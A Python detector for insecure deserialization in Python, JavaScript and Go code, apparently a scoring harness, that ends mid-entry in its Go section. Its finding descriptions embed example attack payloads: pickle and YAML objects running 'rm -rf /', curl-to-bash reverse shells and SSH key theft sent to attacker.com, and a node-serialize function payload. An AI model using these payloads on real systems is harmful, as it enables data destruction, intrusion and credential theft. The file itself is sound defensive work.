"""
Test suite for detecting Insecure Deserialization vulnerabilities.
"""
import re
import sys
from pathlib import Path
from typing import Dict

# Add parent directory to path for utils import
sys.path.insert(0, str(Path(__file__).parent.parent))
from utils.code_locator import find_pattern_locations


class DeserializationDetector:
    """Detects insecure deserialization vulnerabilities in code."""

    def __init__(self):
        self.vulnerabilities = []
        self.score = 0

    def analyze(self, code: str, language: str = "python") -> Dict:
        """Analyze code for insecure deserialization vulnerabilities."""
        if language == "python":
            return self._analyze_python(code)
        elif language == "javascript":
            return self._analyze_javascript(code)
        elif language == "go":
            return self._analyze_go(code)
        elif language == "java":
            return self._analyze_java(code)
        elif language == "rust":
            return self._analyze_rust(code)
        elif language == "csharp":
            return self._analyze_csharp(code)
        elif language in ["cpp", "c"]:
            return self._analyze_cpp(code)
        elif language == "php":
            return self._analyze_php(code)
        else:
            return {"score": 0, "vulnerabilities": ["Unsupported language"], "max_score": 2}

    def _analyze_python(self, code: str) -> Dict:
        """Analyze Python code for insecure deserialization."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: pickle.load/loads (most dangerous - DESERIALIZATION)
        pickle_deserialize_patterns = [
            r'pickle\.load\(',
            r'pickle\.loads\(',
        ]

        pickle_deserialize_locations = []
        for pattern in pickle_deserialize_patterns:
            pickle_deserialize_locations.extend(find_pattern_locations(code, pattern))

        # Pattern 1b: pickle.dumps/dump (SERIALIZATION - enables future deserialization attacks)
        pickle_serialize_patterns = [
            r'pickle\.dump\(',
            r'pickle\.dumps\(',
        ]

        pickle_serialize_locations = []
        for pattern in pickle_serialize_patterns:
            pickle_serialize_locations.extend(find_pattern_locations(code, pattern))

        if pickle_deserialize_locations:
            # Check if data source is user-controlled
            has_user_data = any([
                re.search(r'open\([^)]*input|open\([^)]*request|open\([^)]*user', code, re.IGNORECASE),
                re.search(r'pickle\.load.*request\.|pickle\.load.*user', code, re.IGNORECASE),
                re.search(r'def\s+load_\w+\([^)]*file[^)]*\)', code),  # Function taking filename parameter
                re.search(r'def\s+\w+\([^)]*data[^)]*\).*pickle\.loads', code, re.DOTALL),
                re.search(r'\.read\(\).*pickle\.loads', code, re.DOTALL),
            ])

            # Check for cache-based pickle deserialization with user-controlled keys
            # Pattern: cache key derived from user input (args/kwargs) → attacker can predict filename
            has_cache_pickle = any([
                re.search(r'cache.*pickle|pickle.*cache', code, re.IGNORECASE),
                re.search(r'def\s+cache_\w+|@\w*cache\w*|functools\.wraps', code),
            ])

            has_user_controlled_cache_key = any([
                re.search(r'def\s+\w+_key\w*\([^)]*args|def\s+\w+_key\w*\([^)]*kwargs', code),
                re.search(r'pickle\.dumps\(\(args|pickle\.dumps\(\(.*kwargs', code),
                re.search(r'cache.*\*args|\*\*kwargs', code),
            ])

            # If it's a caching system with pickle and user-controlled cache keys
            if has_cache_pickle and has_user_controlled_cache_key:
                has_user_data = True  # Treat as user-controlled

            # Check for validation/signing
            # IMPORTANT: hashlib alone is NOT signing - must have HMAC verification
            # Pattern: hashlib used for cache keys (/hashing) ≠ HMAC signing/verification
            has_signing = any([
                re.search(r'hmac\.new|hmac\.compare_digest|verify.*hmac', code, re.IGNORECASE),
                re.search(r'itsdangerous|cryptography|nacl', code),
                re.search(r'verify.*signature|check.*signature', code, re.IGNORECASE),
            ])

            if not has_signing:
                # Use first location for reporting
                location = pickle_deserialize_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']

                if has_user_data:
                    self.vulnerabilities.append({
                        "type": "INSECURE_DESERIALIZATION",
                        "severity": "CRITICAL",
                        "description": "Uses pickle.load() on user-controlled data - REMOTE CODE EXECUTION: pickle can execute arbitrary Python code during deserialization. ATTACK POC: Attacker creates malicious pickle: class Exploit: def __reduce__(self): return (os.system, ('rm -rf /',)). When victim calls pickle.loads(attacker_data), it executes os.system('rm -rf /'). IMPACT: Complete server compromise, data theft, ransomware deployment, botnet installation. REAL-WORLD: Pickle deserialization RCE is CVE-worthy vulnerability, used in real attacks against Django, Flask, Jupyter apps.",
                        "recommendation": "NEVER use pickle with untrusted data. Use JSON instead: json.loads(data). If you must serialize Python objects, use itsdangerous.Serializer with HMAC signing: from itsdangerous import Serializer; s = Serializer(secret_key); obj = s.loads(data)",
                        "example_attack": "import pickle, os; exploit = pickle.dumps(type('Exploit', (), {'__reduce__': lambda self: (os.system, ('curl attacker.com/shell.sh | bash',))})()) → sending this to victim's pickle.loads() gives attacker reverse shell",
                        "line_number": line_num,
                        "code_snippet": code_snippet,
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "pickle.load() or pickle.loads() called on data from untrusted source",
                                "User-controlled input (HTTP requests, file uploads, external APIs) deserialized with pickle",
                                "No HMAC signature verification or cryptographic validation before deserialization",
                                "Python's pickle module can execute arbitrary code via __reduce__ method"
                            ],
                            "why_vulnerable": [
                                f"Line {line_num}: pickle.load() or pickle.loads() processes untrusted data",
                                "Data source is user-controlled (request parameters, file uploads, cache with user-controlled keys)",
                                "pickle.load() automatically calls __reduce__ method during deserialization",
                                "Attacker can craft malicious pickle with __reduce__ returning (os.system, ('malicious command',))",
                                "No signature verification - application cannot distinguish legitimate data from attacker payloads",
                                "ATTACK: pickle.loads(malicious_data) → executes os.system('curl attacker.com/shell | bash') → reverse shell"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "pickle.load() and pickle.loads() usage",
                                "User data sources (request.*, open(), file parameters, cache keys from args/kwargs)",
                                "HMAC signature verification (hmac.new, hmac.compare_digest, itsdangerous)",
                                "Safe alternatives (json.loads, yaml.safe_load)"
                            ],
                            "evidence": {
                                "found_patterns": ["pickle.load/loads with user-controlled data source"],
                                "line_numbers": [line_num],
                                "code_snippets": [code_snippet]
                            }
                        }
                    })
                    self.score = 0
                else:
                    # Still vulnerable if attacker can modify files
                    self.vulnerabilities.append({
                        "type": "INSECURE_DESERIALIZATION",
                        "severity": "HIGH",
                        "description": "Uses pickle without signature verification - ARBITRARY CODE EXECUTION RISK: pickle.load() can execute code if attacker modifies pickle files. ATTACK SCENARIO: (1) App stores user preferences in ~/.cache/app.pickle, (2) Attacker modifies file with malicious payload using __reduce__ method, (3) App loads pickle → executes attacker's code. VULNERABLE EVEN IF: data isn't from HTTP request, attacker just needs filesystem access (shared hosting, container escape, stolen backup). IMPACT: Privilege escalation, backdoor installation, data exfiltration.",
                        "recommendation": "Replace pickle with JSON for data: json.load(f). If you need Python object serialization, use signed pickle: from itsdangerous import Serializer; s = Serializer(SECRET_KEY); data = s.dumps(obj); obj = s.loads(data) # HMAC verified",
                        "example_attack": "User modifies ~/.config/app.pickle with: class Evil: __reduce__ = lambda self: (__import__('os').system, ('cat ~/.ssh/id_rsa | curl -d @- attacker.com',)) → next app startup steals SSH keys",
                        "line_number": line_num,
                        "code_snippet": code_snippet,
                        "detection_reasoning": {
                            "criteria_for_vulnerability": [
                                "pickle.load() used on files or data without HMAC signature verification",
                                "No user-controlled data detected, but pickle files could be modified by attacker",
                                "Attacker with filesystem access can inject malicious pickle data",
                                "Missing cryptographic integrity protection (HMAC, digital signatures)"
                            ],
                            "why_vulnerable": [
                                f"Line {line_num}: pickle.load() without signature verification",
                                "Even if data source appears trusted (local files), attacker can modify pickle files",
                                "ATTACK SCENARIOS: shared hosting (other users modify files), container escape, stolen backups, compromised developer machine",
                                "pickle.load() executes __reduce__ method automatically during deserialization",
                                "No HMAC or signature check - application cannot detect if pickle was tampered with",
                                "IMPACT: Attacker modifies ~/.cache/app.pickle → next load executes arbitrary code"
                            ],
                            "why_not_vulnerable": [],
                            "patterns_checked": [
                                "pickle.load() and pickle.loads() usage",
                                "HMAC verification patterns (hmac.new, hmac.compare_digest, verify_signature)",
                                "Signed serialization libraries (itsdangerous, cryptography, nacl)",
                                "Safe alternatives (json.load, yaml.safe_load)"
                            ],
                            "evidence": {
                                "found_patterns": ["pickle.load/loads without signature verification"],
                                "line_numbers": [line_num],
                                "code_snippets": [code_snippet]
                            }
                        }
                    })
                    self.score = 0

        # Pattern 1c: Check for pickle.dumps/dump usage (WARNING - enables future attacks)
        if pickle_serialize_locations and not pickle_deserialize_locations:
            # Code serializes with pickle but we don't see deserialization in same file
            # This is still risky because the pickled data will need to be deserialized somewhere
            location = pickle_serialize_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            has_signing = any([
                re.search(r'hmac\.new|hmac\.compare_digest|verify.*hmac', code, re.IGNORECASE),
                re.search(r'itsdangerous|cryptography|nacl', code),
                re.search(r'verify.*signature|check.*signature', code, re.IGNORECASE),
            ])

            if not has_signing:
                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "HIGH",
                    "description": "Uses pickle.dumps() to serialize data - ENABLES CODE EXECUTION ATTACKS: Any code that deserializes this pickle data (pickle.loads/load) is vulnerable to arbitrary code execution. ATTACK CHAIN: (1) App stores user data with pickle.dumps(), (2) Attacker injects malicious object before serialization OR modifies pickled bytes after storage, (3) When app/user deserializes → code execution. VULNERABLE SCENARIOS: Caching systems (Redis, files), session storage, message queues, database BLOB fields. IMPACT: Anyone who can trigger deserialization (different function, different server, different user) can execute code.",
                    "recommendation": "Use JSON for data serialization: json.dumps(data) instead of pickle.dumps(). JSON is data-only, cannot execute code. If you MUST serialize Python objects, sign the data: from itsdangerous import Serializer; s = Serializer(SECRET_KEY); signed_data = s.dumps(obj)",
                    "example_attack": "Cache stores pickle.dumps(user_obj). Attacker creates malicious user object with __reduce__ = lambda: (os.system, ('evil',)). When cache.get() deserializes → RCE. Even if attacker can't control serialization, they can modify pickle bytes in storage (Redis, filesystem, database).",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "pickle.dumps() or pickle.dump() used to serialize data without signature",
                            "Serialized pickle data stored in cache, database, files, or message queue",
                            "No HMAC signing to protect integrity of serialized data",
                            "Future deserialization (pickle.load/loads) will execute code if data is tampered with"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: pickle.dumps() serializes data without signing",
                            "Pickle data will be stored and later deserialized, creating attack opportunity",
                            "ATTACK VECTOR 1: Attacker injects malicious object before serialization (if they control input)",
                            "ATTACK VECTOR 2: Attacker modifies pickle bytes after storage (Redis, files, DB have weaker access controls)",
                            "When deserialization occurs (same or different function), malicious __reduce__ executes",
                            "No HMAC signature - deserializer cannot verify data integrity",
                            "IMPACT: RCE when deserialization happens, possibly in different context (different user, server, privilege level)"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "pickle.dumps() and pickle.dump() usage",
                            "pickle.loads() and pickle.load() in same file (deserialization vulnerability)",
                            "HMAC signing patterns (hmac.new, itsdangerous.Serializer)",
                            "Safe alternatives (json.dumps)"
                        ],
                        "evidence": {
                            "found_patterns": ["pickle.dumps/dump without signature"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                self.score = 0

        # Pattern 2: PyYAML unsafe loading
        uses_unsafe_yaml = any([
            re.search(r'yaml\.load\([^,)]*\)', code),  # yaml.load() without Loader
            re.search(r'yaml\.unsafe_load\(', code),
            re.search(r'yaml\.load\([^)]*Loader\s*=\s*yaml\.Loader\)', code),
        ])

        if uses_unsafe_yaml:
            yaml_locations = []
            for pattern in [r'yaml\.load\([^,)]*\)', r'yaml\.unsafe_load\(', r'yaml\.load\([^)]*Loader\s*=\s*yaml\.Loader\)']:
                yaml_locations.extend(find_pattern_locations(code, pattern))

            if yaml_locations:
                location = yaml_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']
            else:
                line_num = 0
                code_snippet = ""

            self.vulnerabilities.append({
                "type": "INSECURE_DESERIALIZATION",
                "severity": "CRITICAL",
                "description": "Uses yaml.load() without safe_load - allows arbitrary code execution (use yaml.safe_load())",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "yaml.load() called without Loader=yaml.SafeLoader parameter",
                        "yaml.unsafe_load() explicitly used (dangerous API)",
                        "yaml.load() with Loader=yaml.Loader (full Python object construction)",
                        "YAML deserialization can instantiate arbitrary Python objects and execute code"
                    ],
                    "why_vulnerable": [
                        f"Line {line_num}: yaml.load() without SafeLoader or yaml.unsafe_load() used",
                        "PyYAML's default Loader can construct arbitrary Python objects from YAML",
                        "ATTACK: Attacker sends YAML with !!python/object/apply directive to execute functions",
                        "EXAMPLE: !!python/object/apply:os.system ['rm -rf /'] → executes os.system('rm -rf /')",
                        "REAL-WORLD: CVE-2017-18342, used in attacks against config parsers and web apps",
                        "IMPACT: Remote code execution, complete system compromise"
                    ],
                    "why_not_vulnerable": [],
                    "patterns_checked": [
                        "yaml.load() without Loader parameter (defaults to unsafe FullLoader in old PyYAML)",
                        "yaml.unsafe_load() explicit usage",
                        "yaml.load() with Loader=yaml.Loader (full object construction)",
                        "yaml.safe_load() usage (safe alternative)"
                    ],
                    "evidence": {
                        "found_patterns": ["Unsafe YAML loading"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })
            self.score = 0

        # Pattern 3: marshal (also dangerous)
        marshal_locations = find_pattern_locations(code, r'marshal\.load')
        if marshal_locations:
            location = marshal_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            self.vulnerabilities.append({
                "type": "INSECURE_DESERIALIZATION",
                "severity": "HIGH",
                "description": "Uses marshal.load() - can execute arbitrary bytecode (use JSON for data)",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "marshal.load() or marshal.loads() used to deserialize data",
                        "marshal can deserialize Python bytecode objects (code objects)",
                        "Attacker-controlled marshal data can contain malicious bytecode",
                        "No integrity verification or sandboxing of deserialized bytecode"
                    ],
                    "why_vulnerable": [
                        f"Line {line_num}: marshal.load() deserializes data that may contain bytecode",
                        "marshal is designed for Python bytecode (.pyc files), not data serialization",
                        "Can deserialize code objects which execute when called or instantiated",
                        "ATTACK: Attacker crafts malicious marshal data with bytecode payload",
                        "EXAMPLE: marshal.dumps(compile('__import__(\"os\").system(\"evil\")', '', 'exec')) → RCE",
                        "IMPACT: Arbitrary bytecode execution, similar to eval() but harder to detect"
                    ],
                    "why_not_vulnerable": [],
                    "patterns_checked": [
                        "marshal.load() and marshal.loads() usage",
                        "marshal.dump() and marshal.dumps() usage (serialization side)",
                        "Safe alternatives (json.load for data)"
                    ],
                    "evidence": {
                        "found_patterns": ["marshal.load usage"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })
            self.score = 0

        # Pattern 4: shelve (uses pickle internally)
        shelve_locations = find_pattern_locations(code, r'shelve\.open\(')
        if shelve_locations:
            has_signing = re.search(r'hmac|signature|verify', code, re.IGNORECASE)
            if not has_signing:
                location = shelve_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']

                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "MEDIUM",
                    "description": "Uses shelve (pickle-based) without integrity checks - vulnerable to tampering",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "shelve.open() used for persistent storage (uses pickle internally)",
                            "No HMAC or signature verification for shelve database integrity",
                            "Attacker with filesystem access can modify shelve database files",
                            "shelve uses pickle for serialization - inherits pickle's code execution risks"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: shelve.open() creates pickle-based database",
                            "shelve internally uses pickle to serialize/deserialize stored objects",
                            "No integrity protection - attacker can modify .db/.dat files",
                            "ATTACK: Attacker modifies shelve database file with malicious pickle data",
                            "When application reads from shelve, pickle.load() executes attacker's __reduce__ method",
                            "IMPACT: Code execution on next database read, privilege escalation"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "shelve.open() usage",
                            "HMAC or signature verification patterns",
                            "Safe alternatives (SQLite with JSON, Redis with JSON)"
                        ],
                        "evidence": {
                            "found_patterns": ["shelve.open without integrity checks"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                if self.score > 1:
                    self.score = 1

        # Pattern 5: Check for safe alternatives (positive indicator)
        uses_safe_serialization = any([
            re.search(r'json\.load|json\.loads|json\.dump|json\.dumps', code),
            re.search(r'yaml\.safe_load\(', code),
            re.search(r'itsdangerous\.Serializer', code),
        ])

        if uses_safe_serialization and len(pickle_deserialize_locations) == 0 and len(pickle_serialize_locations) == 0 and not uses_unsafe_yaml:
            # Find location of safe serialization
            safe_locations = []
            safe_locations.extend(find_pattern_locations(code, r'json\.load|json\.loads'))
            safe_locations.extend(find_pattern_locations(code, r'yaml\.safe_load\('))
            safe_locations.extend(find_pattern_locations(code, r'itsdangerous\.Serializer'))

            if safe_locations:
                location = safe_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']
            else:
                line_num = 0
                code_snippet = ""

            # Determine which method is used
            uses_json = re.search(r'json\.load|json\.loads|json\.dump|json\.dumps', code)
            uses_yaml_safe = re.search(r'yaml\.safe_load\(', code)
            uses_itsdangerous = re.search(r'itsdangerous\.Serializer', code)

            methods = []
            if uses_json:
                methods.append("JSON (data-only, no code execution)")
            if uses_yaml_safe:
                methods.append("yaml.safe_load() (restricted YAML)")
            if uses_itsdangerous:
                methods.append("itsdangerous (signed serialization)")

            methods_str = " + ".join(methods) if methods else "safe serialization"

            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": f"Uses safe serialization: {methods_str}",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "pickle.load/loads on untrusted data (arbitrary code execution)",
                        "yaml.load without SafeLoader (object instantiation attacks)",
                        "marshal.load on untrusted data (bytecode execution)",
                        "shelve without integrity protection (pickle-based tampering)"
                    ],
                    "why_vulnerable": [],
                    "why_not_vulnerable": [
                        item for item in [
                            f"Line {line_num}: Uses {methods_str} for serialization",
                            "JSON is data-only format - cannot represent code or objects with methods" if uses_json else None,
                            "yaml.safe_load() only constructs simple Python types (dict, list, str, int)" if uses_yaml_safe else None,
                            "itsdangerous provides HMAC-signed serialization with tamper detection" if uses_itsdangerous else None,
                            "No pickle usage detected - avoids arbitrary code execution risk",
                            "No unsafe YAML loading (yaml.load, yaml.unsafe_load)"
                        ] if item is not None
                    ],
                    "patterns_checked": [
                        "pickle.load/loads and pickle.dump/dumps",
                        "yaml.load without SafeLoader",
                        "marshal.load",
                        "shelve.open",
                        "Safe alternatives: json, yaml.safe_load, itsdangerous"
                    ],
                    "evidence": {
                        "found_patterns": [methods_str],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0

        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):

            self.score = 0


        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_javascript(self, code: str) -> Dict:
        """Analyze JavaScript code for insecure deserialization."""
        self.vulnerabilities = []
        self.score = 2

        # Pattern 1: eval() on serialized data
        eval_locations = find_pattern_locations(code, r'eval\(')
        uses_eval = len(eval_locations) > 0

        if uses_eval:
            has_user_data = any([
                re.search(r'eval\([^)]*req\.|eval\([^)]*request', code),
                re.search(r'eval\([^)]*cookie|eval\([^)]*localStorage', code),
                re.search(r'eval\([^)]*\.read|eval\([^)]*\.data', code),
            ])

            location = eval_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            if has_user_data:
                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "CRITICAL",
                    "description": "Uses eval() on user data - allows arbitrary code execution (use JSON.parse())",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "eval() function called on user-controlled data",
                            "Data from HTTP requests (req.body, req.query, req.params) passed to eval()",
                            "Data from cookies or localStorage passed to eval()",
                            "eval() can execute arbitrary JavaScript code from string input"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: eval() processes user-controlled data from HTTP request or storage",
                            "eval() interprets string as JavaScript code and executes it",
                            "ATTACK: User sends malicious code in data: eval('(' + attacker_payload + ')') → code execution",
                            "EXAMPLE: attacker_payload = 'require(\"child_process\").exec(\"curl attacker.com | bash\")' → reverse shell",
                            "No input validation can prevent eval() attacks - any valid JavaScript syntax executes",
                            "IMPACT: Remote code execution, server compromise, data theft, denial of service"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "eval() usage with user data sources (req.*, cookie, localStorage)",
                            "Safe alternatives (JSON.parse)",
                            "Function() constructor (similar vulnerability)",
                            "node-serialize.unserialize() usage"
                        ],
                        "evidence": {
                            "found_patterns": ["eval() with user-controlled data"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                self.score = 0
            else:
                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "HIGH",
                    "description": "Uses eval() - dangerous if data source is compromised (use JSON.parse())",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "eval() function used (inherently dangerous)",
                            "Data source not identified as user-controlled, but could be compromised",
                            "eval() executes any JavaScript code in string form",
                            "Risk exists if data source (file, database, cache) is tampered with"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: eval() used on data source",
                            "Even if data isn't directly from HTTP request, eval() is risky",
                            "ATTACK SCENARIOS: compromised config file, modified cache data, database injection",
                            "eval() has no way to restrict what code can execute",
                            "EXAMPLE: eval(data_from_file) where file contains require('child_process').exec('malicious')",
                            "IMPACT: Code execution if attacker can modify data source"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "eval() usage patterns",
                            "User data sources (req.*, cookie, localStorage)",
                            "Safe alternatives (JSON.parse)",
                            "Function() constructor usage"
                        ],
                        "evidence": {
                            "found_patterns": ["eval() usage"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                self.score = 0

        # Pattern 2: node-serialize unserialize()
        node_serialize_locations = find_pattern_locations(code, r'serialize\.unserialize\(')
        uses_node_serialize = len(node_serialize_locations) > 0

        if uses_node_serialize:
            location = node_serialize_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            self.vulnerabilities.append({
                "type": "INSECURE_DESERIALIZATION",
                "severity": "CRITICAL",
                "description": "Uses node-serialize.unserialize() - allows remote code execution (use JSON.parse())",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "node-serialize.unserialize() used to deserialize data",
                        "node-serialize can deserialize and execute JavaScript functions from serialized form",
                        "Attacker can craft malicious serialized payload with IIFE (Immediately Invoked Function Expression)",
                        "No safe deserialization mode available in node-serialize"
                    ],
                    "why_vulnerable": [
                        f"Line {line_num}: node-serialize.unserialize() processes serialized data",
                        "node-serialize preserves functions during serialization, re-executes them on deserialization",
                        "ATTACK: Attacker sends serialized payload with IIFE: {'rce':'_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"evil\")}()'}",
                        "unserialize() automatically executes the function when deserializing",
                        "REAL-WORLD: CVE-2017-5941, node-serialize RCE vulnerability widely exploited",
                        "IMPACT: Remote code execution, complete server compromise, reverse shell"
                    ],
                    "why_not_vulnerable": [],
                    "patterns_checked": [
                        "node-serialize.unserialize() usage",
                        "serialize.serialize() usage (creates vulnerable data)",
                        "Safe alternatives (JSON.parse, JSON.stringify)"
                    ],
                    "evidence": {
                        "found_patterns": ["node-serialize.unserialize() usage"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })
            self.score = 0

        # Pattern 3: Function constructor (similar to eval)
        function_constructor_locations = find_pattern_locations(code, r'new\s+Function\(')
        if function_constructor_locations:
            has_user_data = re.search(r'new\s+Function\([^)]*req\.|new\s+Function\([^)]*cookie', code)
            if has_user_data:
                location = function_constructor_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']

                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "CRITICAL",
                    "description": "Uses Function() constructor on user data - allows code execution",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "Function() constructor called with user-controlled data",
                            "Data from HTTP requests or cookies used to construct function",
                            "Function() constructor compiles and can execute arbitrary JavaScript code",
                            "Similar security risk to eval() but harder to detect"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: Function() constructor uses user-controlled data",
                            "new Function(args, body) compiles string body as JavaScript function",
                            "ATTACK: new Function(req.body.code) where req.body.code = 'return require(\"child_process\").exec(\"evil\")'",
                            "Function created from user input can execute arbitrary code when called",
                            "EXAMPLE: const fn = new Function(user_input); fn() → executes attacker's code",
                            "IMPACT: Remote code execution, server compromise, same as eval() vulnerability"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "new Function() constructor with user data (req.*, cookie)",
                            "eval() usage patterns",
                            "Safe alternatives (JSON.parse, predefined function maps)"
                        ],
                        "evidence": {
                            "found_patterns": ["Function() constructor with user data"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                self.score = 0

        # Pattern 4: vm.runInContext without proper sandboxing
        vm_run_locations = find_pattern_locations(code, r'vm\.run')
        if vm_run_locations:
            has_sandbox = re.search(r'createContext\(.*\{.*\}\)', code)
            if not has_sandbox:
                location = vm_run_locations[0]
                line_num = location['line_number']
                code_snippet = location['line_content']

                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "HIGH",
                    "description": "Uses vm.run without proper sandbox - can lead to code execution",
                    "line_number": line_num,
                    "code_snippet": code_snippet,
                    "detection_reasoning": {
                        "criteria_for_vulnerability": [
                            "vm.runInContext, vm.runInThisContext, or vm.runInNewContext used",
                            "No proper sandbox context created with createContext()",
                            "vm module provides access to V8 JavaScript engine",
                            "Without sandbox, code can access Node.js APIs and file system"
                        ],
                        "why_vulnerable": [
                            f"Line {line_num}: vm.run* method used without proper sandbox",
                            "Node.js vm module executes code in V8 context but can escape without sandbox",
                            "Without createContext() restrictions, code can access process, require, fs modules",
                            "ATTACK: vm.runInContext(user_code) where user_code accesses global.process.mainModule.require('child_process')",
                            "SANDBOX ESCAPE: Even with context, vm2 had multiple escapes (CVE-2023-29199, CVE-2023-30547)",
                            "IMPACT: Code execution, sandbox escape, file system access, require() abuse"
                        ],
                        "why_not_vulnerable": [],
                        "patterns_checked": [
                            "vm.runInContext, vm.runInThisContext, vm.runInNewContext usage",
                            "createContext() with restrictive sandbox object",
                            "Safe alternatives (isolated workers, separate processes)"
                        ],
                        "evidence": {
                            "found_patterns": ["vm.run without proper sandbox"],
                            "line_numbers": [line_num],
                            "code_snippets": [code_snippet]
                        }
                    }
                })
                if self.score > 1:
                    self.score = 1

        # Pattern 5: Check for safe alternatives
        json_parse_locations = find_pattern_locations(code, r'JSON\.parse\(')
        uses_json_parse = len(json_parse_locations) > 0

        if uses_json_parse and not uses_eval and not uses_node_serialize:
            location = json_parse_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            self.vulnerabilities.append({
                "type": "SECURE",
                "severity": "INFO",
                "description": "Uses safe JSON.parse() for deserialization",
                "line_number": line_num,
                "code_snippet": code_snippet,
                "detection_reasoning": {
                    "criteria_for_vulnerability": [
                        "eval() on user data (arbitrary JavaScript code execution)",
                        "node-serialize.unserialize() (function deserialization and execution)",
                        "new Function() constructor with user input (dynamic code compilation)",
                        "vm.run without sandbox (V8 context escape)"
                    ],
                    "why_vulnerable": [],
                    "why_not_vulnerable": [
                        f"Line {line_num}: Uses JSON.parse() for deserialization",
                        "JSON.parse() only parses data - cannot execute code or create functions",
                        "JSON format is restricted to data types: object, array, string, number, boolean, null",
                        "No function deserialization - JSON cannot represent executable code",
                        "Safe against code injection attacks that exploit eval() or node-serialize",
                        "Built-in protection: JSON.parse() throws SyntaxError on malformed input instead of executing it"
                    ],
                    "patterns_checked": [
                        "eval() usage",
                        "node-serialize.unserialize() usage",
                        "new Function() constructor",
                        "vm.run* methods",
                        "JSON.parse() and JSON.stringify() (safe alternatives)"
                    ],
                    "evidence": {
                        "found_patterns": ["JSON.parse() usage"],
                        "line_numbers": [line_num],
                        "code_snippets": [code_snippet]
                    }
                }
            })

        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0

        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):

            self.score = 0


        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }

    def _analyze_go(self, code: str) -> Dict:
        """Analyze Go code for insecure deserialization."""
        self.vulnerabilities = []
        self.score = 2

        # Check if code uses encoding/gob or json
        uses_deserialize = re.search(r'encoding/gob|json\.Unmarshal', code)
        if not uses_deserialize:
            return {"score": self.score, "vulnerabilities": self.vulnerabilities, "max_score": 2}

        # Pattern 1: gob.Decode without validation
        gob_decode_locations = find_pattern_locations(code, r'\.Decode\(')
        uses_gob = re.search(r'gob\.NewDecoder|encoding/gob', code)

        if gob_decode_locations and uses_gob:
            # Check for type validation after decode
            has_validation = any([
                re.search(r'if.*!=.*nil', code),  # Error checking
                re.search(r'switch.*\.(type)', code),  # Type switch
                re.search(r'if.*\.(type)', code),  # Type assertion check
            ])

            location = gob_decode_locations[0]
            line_num = location['line_number']
            code_snippet = location['line_content']

            if not has_validation:
                self.vulnerabilities.append({
                    "type": "INSECURE_DESERIALIZATION",
                    "severity": "HIGH",
